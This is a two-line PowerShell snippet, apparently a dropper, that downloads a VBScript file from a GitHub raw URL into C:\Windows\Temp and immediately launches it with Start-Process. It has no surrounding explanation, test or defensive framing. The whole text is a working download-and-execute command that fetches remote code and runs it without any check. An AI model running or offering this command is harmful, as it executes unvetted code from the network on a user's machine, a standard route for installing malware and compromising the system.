(New-Object System.Net.WebClient).DownloadFile("https://github.com/rude90/VBS/raw/main/test.vbs", "C:\Windows\Temp\test.vbs")
Start-Process "C:\Windows\Temp\test.vbs"
